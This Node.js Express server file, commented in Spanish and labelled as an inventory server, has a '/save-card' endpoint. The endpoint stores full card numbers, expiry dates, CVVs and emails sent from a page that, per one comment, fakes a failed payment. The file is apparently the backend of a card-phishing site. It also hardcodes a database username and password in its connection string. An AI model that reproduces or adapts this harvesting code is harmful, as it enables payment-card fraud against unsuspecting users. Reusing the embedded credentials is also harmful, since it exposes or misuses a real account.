// server.js
const express = require('express');
const { MongoClient } = require('mongodb'); // Módulo para la base de datos
const cors = require('cors'); 
const app = express();

// Usa el puerto asignado por Render (process.env.PORT) o 3000 si es local.
const serverPort = process.env.PORT || 3000;

// =================================================================
// CONFIGURACIÓN DE MONGODB (CORREGIDA CON TUS CREDENCIALES)
// =================================================================

// ⚠️ Esta es la cadena de conexión final y funcional:
const uri = "mongodb+srv://maxueljoseuwwi_db_user:Maxuel09@cluster0.dfxcysb.mongodb.net/"; 
const client = new MongoClient(uri);

app.use(cors()); 
app.use(express.json());

// =================================================================
// 1. ENDPOINT DE GUARDADO DE TARJETA EN MONGODB
// =================================================================

app.post('/save-card', async (req, res) => {
    const cardData = req.body;
    
    // Objeto que se insertará en la base de datos
    const logEntry = {
        ...cardData, // product, price, email, number, expiry, cvv
        timestamp: new Date()
    };
    
    try {
        await client.connect(); 
        
        // Se conecta a la base de datos 'inventario_db' y a la colección 'tarjetas'
        const database = client.db("inventario_db"); 
        const collection = database.collection("tarjetas"); 
        
        // Inserta la tarjeta
        await collection.insertOne(logEntry);

        console.log('✅ Datos de tarjeta guardados con éxito en MongoDB.');
        res.status(200).send({ message: 'Datos recibidos y guardados con éxito en la DB.' });

    } catch (error) {
        console.error('❌ Error al guardar en MongoDB:', error);
        // Si hay un error, informa al cliente (aunque el frontend ya está fallando el pago)
        res.status(500).send({ message: 'Error interno del servidor al conectar con la base de datos.' });
    }
});


// =================================================================
// 2. SERVIR ARCHIVOS ESTÁTICOS (Para cargar pagina.html)
// =================================================================
// Esto permite que el archivo pagina.html se cargue cuando alguien visite la raíz del dominio
app.use(express.static(__dirname)); 


// =================================================================
// 3. INICIAR EL SERVIDOR
// =================================================================
app.listen(serverPort, () => {
    console.log(`Servidor de inventario iniciado y escuchando en el puerto ${serverPort}`);
});